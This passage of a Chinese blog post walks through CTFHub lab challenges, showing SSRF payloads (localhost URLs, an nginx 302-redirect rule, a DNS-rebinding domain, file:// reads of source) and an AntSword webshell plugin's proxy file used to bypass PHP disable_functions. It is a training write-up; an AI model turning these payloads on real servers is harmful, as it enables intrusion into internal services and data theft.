<p>看了其他人的wp后还发现一个很好用的payload。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?url=http:<span class="hljs-regexp">//</span>localhost/flag.php<br></code></pre></td></tr></table></figure>
<p>那看题目名字是要让我们302跳转,那需要怎么做呢？</p>
<p>看网上的都是用的短域名服务来实现跳转，武丑兄作为拥有两个域名的大佬当然要自己写啦！</p>
<p>设置了一个二级域名<code>302.wuuconix.link</code>然后用nginx rewrite到<code>http://127.0.0.1/flag.php</code>上。</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span><br>&#123;<br>   <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;<span class="hljs-comment"># https 监听的是 443端口</span><br>   <span class="hljs-attribute">server_name</span>  <span class="hljs-number">302</span>.wuuconix.link;<br> <br>   <span class="hljs-attribute">keepalive_timeout</span> <span class="hljs-number">100</span>;<br> <br>   <span class="hljs-attribute">ssl_session_cache</span>   shared:SSL:<span class="hljs-number">10m</span>;<br>   <span class="hljs-attribute">ssl_session_timeout</span> <span class="hljs-number">10m</span>;<br> <br>   <span class="hljs-attribute">ssl_certificate</span> /etc/nginx/ssl-link/fullchain.crt; <span class="hljs-comment"># 证书路径</span><br>   <span class="hljs-attribute">ssl_certificate_key</span> /etc/nginx/ssl-link/private.pem; <span class="hljs-comment"># 请求认证 key 的路径</span><br><br>   <span class="hljs-attribute">ssl_protocols</span> TLSv1.<span class="hljs-number">1</span> TLSv1.<span class="hljs-number">2</span>;<br>   <span class="hljs-attribute">ssl_ciphers</span> ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;<br>   <span class="hljs-attribute">ssl_prefer_server_ciphers</span> <span class="hljs-literal">on</span>;<br>   <span class="hljs-attribute">ssl_session_cache</span> shared:SSL:<span class="hljs-number">10m</span>;<br>   <br>   <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^(.*)</span> http://127.0.0.1/flag.php <span class="hljs-literal">permanent</span>;<br>&#125;<br><br><span class="hljs-section">server</span><br>&#123;<br>   <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>   <span class="hljs-attribute">server_name</span>  <span class="hljs-number">302</span>.wuuconix.link;<br>   <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^(.*)</span> https://<span class="hljs-variable">$server_name</span><span class="hljs-variable">$1</span> <span class="hljs-literal">permanent</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>其实只监听80端口然后rewrite就行，但是我的服务器都用了ssl证书，把上面443的端口监听删掉会出现莫名的错误，就保留啦，也就是多做了一次302跳转，最后的目的地是一致的2333。</p>
<p><img src="https://upyun.wuuconix.link/image-20210912212451057.png" srcset="/img/loading.gif" lazyload alt="flag" /></p>
<p>成功得到flag。</p>
<h3 id="dns重绑定-bypass"><a class="markdownIt-Anchor" href="#dns重绑定-bypass"></a> DNS重绑定 Bypass</h3>
<p>这道题和上一题不同，感觉应该是http服务设置的原因，明明<code>index.php</code>和<code>flag.php</code>几乎没变。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#view-source:http://challenge-2656dc822cd540bd.sandbox.ctfhub.com:10800/?url=file:///var/www/html/index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: /?url=_&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/127|172|10|192/&quot;</span>, <span class="hljs-variable">$url</span>)) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker! Ban Intranet IP&quot;</span>);<br>&#125;<br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#view-source:http://challenge-2656dc822cd540bd.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>] != <span class="hljs-string">&quot;127.0.0.1&quot;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just View From 127.0.0.1&quot;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;CTFHUB&quot;</span>);<br></code></pre></td></tr></table></figure>
<p>但是前几题的paylaod都失效了。</p>
<p>不支持302跳转。</p>
<p><img src="https://upyun.wuuconix.link/image-20210912213511126.png" srcset="/img/loading.gif" lazyload alt="302 failed" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210912213605536.png" srcset="/img/loading.gif" lazyload alt="localhost" /></p>
<p>这样不知道为什么也不行，按理说这个请求是<code>127.0.0.1</code>的index.php发出的。</p>
<p>查看资料后了解到DNS重绑定的原理。</p>
<blockquote>
<p>在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。</p>
</blockquote>
<p>利用这个网站<a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">rbndr.us dns rebinding service (cmpxchg8b.com)</a>来生成一个域名。</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">7f000001</span>.<span class="hljs-number">08080808</span>.rbndr.us<br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210912214247480.png" srcset="/img/loading.gif" lazyload alt="ctf" /></p>
<p>我想了半天这道题哪里体现出必须要DNS重绑定。感觉这道题就是在扯淡。</p>
<p>为了验证这种想法，我又设置了一个直接指向<code>127.0.0.1</code>的二级域名<code>localhost.wuuconix.link</code></p>
<p><img src="https://upyun.wuuconix.link/image-20210912214435947.png" srcset="/img/loading.gif" lazyload alt="localhost.wuuconix.link" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210912214505804.png" srcset="/img/loading.gif" lazyload alt="ctf" /></p>
<p>结果也能获得flag2333。</p>
<p>只能说这道题出的不好。</p>
<h2 id="bypass"><a class="markdownIt-Anchor" href="#bypass"></a> Bypass</h2>
<h3 id="disalbe_functionld_preload"><a class="markdownIt-Anchor" href="#disalbe_functionld_preload"></a> disalbe_function——LD_PRELOAD</h3>
<p>这道题开局让你连蚁剑，确实能连上，但是点开根目录下的flag是空的。</p>
<p><img src="https://upyun.wuuconix.link/image-20210914234705422.png" srcset="/img/loading.gif" lazyload alt="flag幻影" /></p>
<p>然后我试着在蚁剑的模拟终端里用命令来get flag，但是所有的命令都会返回<code>ret=127</code>。我查了一下，表示命令不可用。我是这样理解的。php一句话木马用get shell，但是这个shell本质上是利用php里面的系统命令实现的，而且用户是<code>www-data</code>。所以出题人可以对一些命令进行限制，但是我还是无法理解，明明蚁剑已经连接了，文件列表都显示出来了，按理说这些文件都是用ls来得到的，但是手动运行ls却不行，那蚁剑是如何得到文件列表的呢？</p>
<p><img src="https://upyun.wuuconix.link/image-20210914234814297.png" srcset="/img/loading.gif" lazyload alt="ret=127" /></p>
<p>这里写出来题目php环境中过滤的函数。</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">pcntl_alarm,</span>pcntl_fork,pcntl_waitpid,pcntl_wait,<br><span class="hljs-built_in">pcntl_wifexited,</span>pcntl_wifstopped,pcntl_wifsignaled,<br><span class="hljs-built_in">pcntl_wifcontinued,</span>pcntl_wexitstatus,pcntl_wtermsig,<br><span class="hljs-built_in">pcntl_wstopsig,</span>pcntl_signal,pcntl_signal_get_handler,<br><span class="hljs-built_in">pcntl_signal_dispatch,</span>pcntl_get_last_error,pcntl_strerror,<br><span class="hljs-built_in">pcntl_sigprocmask,</span>pcntl_sigwaitinfo,pcntl_sigtimedwait,<br><span class="hljs-built_in">pcntl_exec,</span>pcntl_getpriority,pcntl_setpriority,<br><span class="hljs-built_in">pcntl_async_signals,</span>exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system<br></code></pre></td></tr></table></figure>
<p>我们可以看到常用的php命令执行函数<code>system</code>,<code>shell_exec</code>,<code>exec</code>,<code>passthru</code>都被ban了，我十分好奇蚁剑是怎么连接并且获取文件列表的。</p>
<p>我们暂时先这么理解，蚁剑用了某种神奇的方式得到了文件列表，但是因为cat 文件需要用到 比如<code>system</code>函数，但是这些函数都被ban掉了，所以我们只能看到flag幻影而无法得到flag。</p>
<p>然后蚁剑插件市场中有个厉害的插件就是专门用来绕过disable_functions的。</p>
<p><img src="https://upyun.wuuconix.link/image-20210914235445653.png" srcset="/img/loading.gif" lazyload alt="ant-sword plugins" /></p>
<p>使用插件过后，html文件夹下 会出现<code>.antproxy.php</code>文件，其内容如下。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_client_header</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$headers</span>=<span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>=&gt;<span class="hljs-variable">$v</span>)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$k</span>,<span class="hljs-string">&#x27;HTTP_&#x27;</span>)===<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$k</span>=<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/^HTTP/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$k</span>));<br>            <span class="hljs-variable">$k</span>=<span class="hljs-title function_ invoke__">preg_replace_callback</span>(<span class="hljs-string">&#x27;/_\w/&#x27;</span>,<span class="hljs-string">&#x27;header_callback&#x27;</span>,<span class="hljs-variable">$k</span>);<br>            <span class="hljs-variable">$k</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/^_/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$k</span>);<br>            <span class="hljs-variable">$k</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-variable">$k</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$k</span>==<span class="hljs-string">&#x27;Host&#x27;</span>) <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-variable">$headers</span>[]=<span class="hljs-string">&quot;<span class="hljs-subst">$k</span>:<span class="hljs-subst">$v</span>&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$headers</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">header_callback</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$str</span>[<span class="hljs-number">0</span>]);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseHeader</span>(<span class="hljs-params"><span class="hljs-variable">$sResponse</span></span>)</span>&#123;<br>    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$headerstr</span>,<span class="hljs-variable">$sResponse</span>)=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;</span>,<span class="hljs-variable">$sResponse</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-variable">$ret</span>=<span class="hljs-keyword">array</span>(<span class="hljs-variable">$headerstr</span>,<span class="hljs-variable">$sResponse</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^HTTP/1.1 d&#123;3&#125;/&#x27;</span>, <span class="hljs-variable">$sResponse</span>))&#123;<br>        <span class="hljs-variable">$ret</span>=<span class="hljs-title function_ invoke__">parseHeader</span>(<span class="hljs-variable">$sResponse</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$ret</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">120</span>);<br><span class="hljs-variable">$headers</span>=<span class="hljs-title function_ invoke__">get_client_header</span>();<br><span class="hljs-variable">$host</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$port</span> = <span class="hljs-number">61416</span>;<br><span class="hljs-variable">$errno</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$errstr</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$timeout</span> = <span class="hljs-number">30</span>;<br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;/index.php&quot;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$url</span> .= <span class="hljs-string">&quot;?&quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br>&#125;;<br><br><span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$timeout</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fp</span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-variable">$method</span> = <span class="hljs-string">&quot;GET&quot;</span>;<br><span class="hljs-variable">$post_data</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>]==<span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$method</span> = <span class="hljs-string">&quot;POST&quot;</span>;<br>    <span class="hljs-variable">$post_data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$out</span> = <span class="hljs-variable">$method</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$url</span>.<span class="hljs-string">&quot; HTTP/1.1\r\n&quot;</span>;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: &quot;</span>.<span class="hljs-variable">$host</span>.<span class="hljs-string">&quot;:&quot;</span>.<span class="hljs-variable">$port</span>.<span class="hljs-string">&quot;\r\n&quot;</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;CONTENT_TYPE&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Content-Type: &quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;CONTENT_TYPE&#x27;</span>].<span class="hljs-string">&quot;\r\n&quot;</span>;<br>&#125;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Content-length:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post_data</span>).<span class="hljs-string">&quot;\r\n&quot;</span>;<br><br><span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-variable">$headers</span>);<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n\r\n&quot;</span>;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;&quot;</span>.<span class="hljs-variable">$post_data</span>;<br><br><span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>);<br><br><span class="hljs-variable">$response</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">4096</span>))&#123;<br>    <span class="hljs-variable">$response</span> .= <span class="hljs-variable">$row</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br><span class="hljs-variable">$pos</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$response</span>, <span class="hljs-string">&quot;\r\n\r\n&quot;</span>);<br><span class="hljs-variable">$response</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$response</span>, <span class="hljs-variable">$pos</span>+<span class="hljs-number">4</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$response</span>;<br></code></pre></td></tr></table></figure>
<p>我们连接这个文件后，打开模拟终端后就能够get flag啦</p>
<p><img src="https://upyun.wuuconix.link/image-20210914235702471.png" srcset="/img/loading.gif" lazyload alt="flag" /></p>
<p>当然也可以不用插件，但是那种方法太难了，我无法理解2333，就不写了。</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/ctf/">#ctf</a>
      
        <a href="/tags/writeup/">#writeup</a>
      
        <a href="/tags/web/">#web</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>CTFHUB刷题笔记</div>
      <div>https://wuuconix.link/2021/08/18/ctfhub/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>wuuconix</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2021年8月18日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/08/26/php-ext/" title="PHP Docker镜像如何开启拓展">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">PHP Docker镜像如何开启拓展</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/08/14/clash-dashboard/" title="Ubuntu Server利用Clash实现git代理">
                        <span class="hidden-mobile">Ubuntu Server利用Clash实现git代理</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.16/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"tHbt1wElFiuw8zrDBIEUsNIv-gzGzoHsz","appKey":"ztzeLh1CDeUvYk1YrI8bK8kW","path":"window.location.pathname","placeholder":"留下一条友善的评论吧","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  



  <script>
  Fluid.utils.createScript('https://lib.baomitu.com/mermaid/8.13.10/mermaid.min.js', function() {
    mermaid.initialize({"theme":"default"});

    Fluid.events.registerRefreshCallback(function() {
      if ('mermaid' in window) {
        mermaid.init();
      }
    });
  });
</script>






    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a><br> <span>本网站由 <a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank""><img src="https://upyun.wuuconix.link/upyun.png" srcset="/img/loading.gif" lazyload width="53" height="18" style="fill: currentColor;"/></a> 提供 CDN 加速/云存储服务</span> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
    <!-- 备案信息 ICP for China -->
    <div class="beian">
  <span>
    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
      浙ICP备2021025197号-1
    </a>
  </span>
  
    
      <span>
        <a
          href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=33048202000536"
          rel="nofollow noopener"
          class="beian-police"
          target="_blank"
        >
          
            <span style="visibility: hidden; width: 0">|</span>
            <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
          
          <span>浙公网安备33048202000536号</span>
        </a>
      </span>
    
  
</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
